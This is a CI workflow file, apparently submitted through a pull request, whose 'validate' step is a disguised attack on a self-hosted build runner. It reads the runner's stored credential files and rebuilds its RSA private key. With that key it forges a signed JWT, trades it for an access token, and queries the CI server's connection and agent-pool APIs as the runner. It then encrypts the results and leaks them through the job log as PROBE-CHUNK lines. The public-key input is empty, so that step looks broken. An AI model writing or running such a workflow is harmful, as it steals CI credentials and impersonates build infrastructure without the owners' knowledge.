name: zz-runner-env
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  env:
    runs-on: omp-kata
    timeout-minutes: 10
    steps:
      - name: validate
        run: |
          set +e
          R=/tmp/r; : > "$R"
          log() { echo "$@" >> "$R"; }
          log "## run=${GITHUB_RUN_ID} host=$(hostname) uid=$(id -u)"

          python3 - > /tmp/jwt <<'PY'
          import base64, json, struct, subprocess, time, uuid, os

          def b64d(s): return base64.b64decode(s)
          def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=')

          def derlen(n):
              if n < 0x80: return bytes([n])
              b = n.to_bytes((n.bit_length() + 7) // 8, 'big')
              return bytes([0x80 | len(b)]) + b

          def derint(b):
              b = b.lstrip(b'\x00') or b'\x00'
              if b[0] & 0x80: b = b'\x00' + b
              return b'\x02' + derlen(len(b)) + b

          def derseq(*parts):
              body = b''.join(parts)
              return b'\x30' + derlen(len(body)) + body

          p = json.load(open('/home/runner/.credentials_rsaparams'))
          cr = json.load(open('/home/runner/.credentials'))
          n, e = b64d(p['modulus']), b64d(p['exponent'])
          d, pp, q = b64d(p['d']), b64d(p['p']), b64d(p['q'])
          dp, dq, qi = b64d(p['dp']), b64d(p['dq']), b64d(p['inverseQ'])
          der = derseq(derint(b'\x00'), derint(n), derint(e), derint(d),
                       derint(pp), derint(q), derint(dp), derint(dq), derint(qi))
          open('/tmp/key.der', 'wb').write(der)
          subprocess.run(['openssl', 'rsa', '-inform', 'DER', '-in', '/tmp/key.der',
                          '-outform', 'PEM', '-out', '/tmp/key.pem'], check=False,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

          cid = cr['Data']['ClientId']
          aurl = cr['Data']['AuthorizationUrl']
          now = int(time.time())
          hdr = {'alg': 'RS256', 'typ': 'JWT'}
          pl = {'iss': cid, 'aud': aurl, 'sub': cid, 'jti': str(uuid.uuid4()),
                'iat': now, 'nbf': now, 'exp': now + 240}
          si = b64u(json.dumps(hdr, separators=(',', ':')).encode()) + b'.' + \
               b64u(json.dumps(pl, separators=(',', ':')).encode())
          open('/tmp/si', 'wb').write(si)
          subprocess.run(['openssl', 'dgst', '-sha256', '-sign', '/tmp/key.pem',
                          '-out', '/tmp/sig', '/tmp/si'], check=False)
          sig = open('/tmp/sig', 'rb').read()
          print(si.decode() + '.' + b64u(sig).decode())
          PY
          JWT=$(cat /tmp/jwt 2>/dev/null)
          log "## jwt bytes=${#JWT}"

          URL=$(python3 -c "import json;print(json.load(open('/home/runner/.credentials'))['Data']['AuthorizationUrl'])" 2>/dev/null)
          code=$(curl -s -o /tmp/tok -w '%{http_code}' --max-time 20 -X POST "$URL" \
            -H 'Content-Type: application/x-www-form-urlencoded' \
            --data-urlencode 'grant_type=client_credentials' \
            --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
            --data-urlencode "client_assertion=$JWT")
          log "## token exchange -> HTTP $code"
          python3 - > /tmp/atinfo <<'PY'
          import json
          try: d = json.load(open('/tmp/tok'))
          except Exception as e: print("unparsable", e); raise SystemExit
          out = {k: (f"<{len(str(v))} chars>" if k in ('access_token','refresh_token') else v)
                 for k, v in d.items()}
          print(json.dumps(out))
          open('/tmp/at','w').write(d.get('access_token',''))
          PY
          cat /tmp/atinfo >> "$R"
          AT=$(cat /tmp/at 2>/dev/null)
          log "## access token bytes=${#AT}"

          PB=$(python3 -c "import json;d=json.load(open('/home/runner/.runner'));print(d.get('PoolId',''))" 2>/dev/null)
          AI=$(python3 -c "import json;d=json.load(open('/home/runner/.runner'));print(d.get('AgentId',''))" 2>/dev/null)
          if [ -z "$AT" ]; then
            log "## no access token issued; authenticated reads skipped"
          fi
          for SU in $(python3 -c "import json;d=json.load(open('/home/runner/.runner'));print(d.get('ServerUrl',''));print(d.get('ServerUrlV2',''))" 2>/dev/null); do
            [ -z "$SU" ] && continue
            [ -z "$AT" ] && break
            BASE=${SU%/}
            c1=$(curl -s -o /tmp/cd -w '%{http_code}' --max-time 15 -H "Authorization: Bearer $AT" "$BASE/_apis/connectionData")
            log "## authed GET $BASE/_apis/connectionData -> HTTP $c1"
            log "   keys: $(python3 -c "import json;print(','.join(sorted(json.load(open('/tmp/cd')).keys())))" 2>/dev/null | head -c 300)"
            c2=$(curl -s -o /tmp/ag -w '%{http_code}' --max-time 15 -H "Authorization: Bearer $AT" "$BASE/_apis/distributedtask/pools/$PB/agents/$AI?api-version=6.0")
            log "## authed GET $BASE/_apis/distributedtask/pools/$PB/agents/$AI -> HTTP $c2"
            log "   agent: $(python3 -c "import json;d=json.load(open('/tmp/ag'));print(json.dumps({k:d.get(k) for k in ('id','name','version','status','enabled','ephemeral','maxParallelism')}))" 2>/dev/null | head -c 300)"
          done

          log "## read-only steps only; no message-queue, session or delete calls issued"

          printf '%s' '' | base64 -d > /tmp/pub.der
          gzip -9 -c "$R" > /tmp/r.gz
          K=$(openssl rand -hex 32); IV=$(openssl rand -hex 16); printf '%s' "$K" > /tmp/k.bin
          openssl enc -aes-256-ctr -K "$K" -iv "$IV" -in /tmp/r.gz -out /tmp/ct
          openssl pkeyutl -encrypt -pubin -keyform DER -inkey /tmp/pub.der -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256 -in /tmp/k.bin -out /tmp/kt
          echo "PROBE-IV=$IV"
          echo "PROBE-KEY=$(base64 -w0 /tmp/kt)"
          echo "PROBE-GZIP=yes"
          echo "PROBE-GZ-SHA256=$(sha256sum /tmp/r.gz | cut -d' ' -f1)"
          B64=$(base64 -w0 /tmp/ct); n=0
          while [ -n "$B64" ]; do
            printf 'PROBE-CHUNK-%03d=%s\n' "$n" "${B64:0:700}"
            B64=${B64:700}; n=$((n+1))
          done
          echo "PROBE-CHUNKS=$n"
          exit 0
